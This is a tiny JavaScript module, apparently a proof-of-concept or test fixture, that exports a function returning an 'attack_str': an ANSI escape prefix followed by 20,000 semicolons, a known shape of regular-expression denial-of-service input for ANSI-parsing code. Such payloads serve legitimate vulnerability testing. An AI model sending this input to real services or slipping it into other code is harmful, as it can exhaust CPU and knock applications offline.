function getPayload() {
    const attack_str = "\u001B[" + ";".repeat(2 * 10000);
    return { attack_str };
}

module.exports = { getPayload };